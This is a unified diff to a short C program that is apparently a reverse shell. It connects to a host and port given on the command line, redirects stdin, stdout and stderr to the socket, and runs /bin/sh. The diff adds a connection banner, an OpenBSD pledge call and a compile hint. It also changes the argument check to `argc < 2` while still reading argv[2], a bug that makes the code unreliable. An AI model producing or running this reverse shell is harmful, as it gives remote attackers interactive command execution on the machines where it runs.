@@ -14,11 +14,20 @@
 ** PERFORMANCE OF THIS SOFTWARE.
 */
 
+/* Compile with:
+ *	cc -std=c99 -Wall -Wextra -o main main.c
+ */
+
+#define _POSIX_C_SOURCE 201112L
+
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <string.h>
 #include <unistd.h>
 #include <netdb.h>
+
+/* message to display when a client is connected */
+#define C_MSG "Client connected"
 
 static int
 dial(const char *addr, const char *port)
@@ -61,11 +70,17 @@ main(int argc, char *argv[])
 	const char *rport = argv[2];
 	char *const cmd[] = {"/bin/sh", (char *)0};
 	char *const env[] = {(char *)0};
-	if(rhost == NULL || rport == NULL)
+	if(argc < 2)
 		return (-1);
 	sockfd = dial(rhost, rport);
 	if(sockfd == -1)
 		return (-1);
+	write(sockfd, C_MSG"\n", strlen(C_MSG"\n")+1);
+#	ifdef __OpenBSD__
+#	include <err.h>
+	if (pledge("stdio exec", NULL) == -1)
+		err(1, "pledge");
+#	endif
 	(void)dup2(sockfd, 0);
 	(void)dup2(0, 1);
 	(void)dup2(0, 2);
